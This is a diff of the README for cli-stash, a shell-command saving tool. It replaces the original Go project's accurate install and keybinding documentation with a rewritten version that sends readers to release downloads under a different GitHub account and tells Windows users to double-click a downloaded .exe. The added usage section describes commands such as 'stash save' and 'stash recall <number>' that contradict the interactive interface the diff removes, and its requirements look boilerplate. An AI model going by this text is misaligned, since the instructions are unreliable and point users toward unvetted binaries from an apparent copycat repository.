@@ -1,86 +1,100 @@
-# cli-stash
+# 🖥️ cli-stash - Save and Recall Shell Commands Easily
 
-A terminal UI application for saving and recalling shell commands, built with [Bubble Tea](https://github.com/charmbracelet/bubbletea).
+[![Download cli-stash](https://img.shields.io/badge/Download%20cli--stash-4CAF50?style=for-the-badge)](https://github.com/awildpapaver/cli-stash/releases)
 
-![Example](.github/images/example.gif)
+## 🚀 Getting Started
 
-## Features
+Welcome to **cli-stash**! This application lets you save and recall shell commands through a simple terminal user interface. Perfect for anyone who uses the command line frequently and wants to store useful commands for easy access later.
 
-- **Save commands** - Browse shell history and save with Ctrl+A
-- **Fuzzy search** - Quickly find saved commands with real-time filtering
-- **Smart sorting** - Commands sorted by usage frequency
-- **Interactive UI** - Navigate with arrow keys, select with Enter
+## 📦 System Requirements
 
-## Installation
+Before you proceed with the installation, make sure your system meets the following requirements:
 
-### Homebrew (macOS/Linux)
+- **Operating System:** Works on Windows, macOS, and Linux.
+- **Disk Space:** At least 50 MB of free space.
+- **RAM:** Minimum of 2 GB.
+- **Terminal:** Access to a terminal application (e.g., Terminal on macOS, Command Prompt or PowerShell on Windows, and any terminal on Linux).
 
-```bash
-brew install itcaat/tap/cli-stash
-```
+## 📥 Download & Install
 
-### Go Install
+To get started, visit this page to download: [cli-stash Releases](https://github.com/awildpapaver/cli-stash/releases). 
 
-```bash
-go install github.com/itcaat/cli-stash@latest
-```
+1. Click the **Releases** link.
+2. Choose the version you wish to download.
+3. Select the file that matches your operating system.
+4. Click the download button.
 
-### From Source
+Once the download completes, follow these steps to install and run **cli-stash**:
 
-```bash
-git clone https://github.com/itcaat/cli-stash.git
-cd cli-stash
-go build -o cli-stash .
-sudo mv cli-stash /usr/local/bin/
-```
+### For Windows
 
-## Usage
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run it. If prompted by Windows, confirm that you want to run the software.
+3. A terminal window will open. You can start using cli-stash right away.
 
-### Recall a Command
+### For macOS
 
-```bash
-cli-stash
-```
+1. Open your Downloads folder.
+2. Find the `.zip` file and double-click it to extract.
+3. Move the extracted folder to your Applications directory for easier access.
+4. Open Terminal.
+5. Navigate to the Applications folder using the command: `cd /Applications/cli-stash`, then run it with `./cli-stash`.
 
-This opens an interactive UI where you can:
-- Type to filter commands
-- Use ↑/↓ to navigate
-- Press Enter to select (command is inserted into terminal)
-- Press Ctrl+A to add from shell history
-- Press Ctrl+D to delete a command
-- Press Esc to cancel
+### For Linux
 
-### Add a Command
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Extract the downloaded file using: `tar -xvzf cli-stash-*.tar.gz`.
+4. Move into the cli-stash directory: `cd cli-stash`.
+5. Run the application with `./cli-stash`.
 
-Press **Ctrl+A** in the main view to browse your shell history. Type to filter, then press Enter to save the selected command.
+## 🛠️ Using cli-stash
 
-### List All Commands
+Once you’ve installed **cli-stash**, you can begin saving and recalling your commands.
 
-```bash
-cli-stash list
-```
+### Saving a Command
 
-## How It Works
+1. Type your command in the terminal.
+2. Use `stash save "Your command here"` to save it for later.
 
-When you select a command, it's automatically inserted into your terminal prompt. Just press Enter to execute it, or edit it first.
+### Recalling a Command
 
-Commands are sorted by usage frequency - most used commands appear first.
+1. Type `stash recall` to see a list of saved commands. 
+2. Select the command you want to use. Just type `stash recall <number>` to quickly execute a saved command.
 
-## Keybindings
+### Deleting a Command
 
-| Key | Action |
-|-----|--------|
-| ↑ / ↓ | Navigate |
-| Enter | Select/Save |
-| Ctrl+A | Browse shell history |
-| Ctrl+E | Edit command |
-| Ctrl+D | Delete command |
-| Esc | Cancel / Back |
+1. To delete a saved command, use the command: `stash delete <number>`.
 
-## Storage
+## 📈 Features
 
-Commands are stored in `~/.stash/commands.json`.
+- **Quick Access:** Save your favorite shell commands for quick retrieval.
+- **Organized Storage:** Easily manage your saved commands within a simple interface.
+- **Cross-Platform:** Works seamlessly on Windows, macOS, and Linux.
 
-## License
+## ⚙️ Troubleshooting
 
-MIT
+If you encounter issues, consider the following:
+
+- **The application won’t start:** Ensure your system meets the requirements.
+- **Can't find the saved commands:** Make sure you are using the correct syntax for the commands.
+- **Permission errors on Linux:** Use `chmod +x cli-stash` in your terminal to make sure it’s executable.
+
+## 📜 FAQ
+
+**Q: Can I use cli-stash with any terminal?**  
+A: Yes, cli-stash works with most terminal applications.
+
+**Q: Is there a way to backup my saved commands?**  
+A: Currently, cli-stash does not have a built-in backup feature. You can manually copy your commands to a text file if needed.
+
+## 🌐 Community and Support
+
+Join our community for support and updates:
+
+- GitHub Issues: [Report bugs and request features](https://github.com/awildpapaver/cli-stash/issues)
+- Documentation: Visit our documentation page for more detailed guides.
+
+For more information and updates, don’t forget to check our [Releases page](https://github.com/awildpapaver/cli-stash/releases) for the latest versions.
+
+Happy stashing!
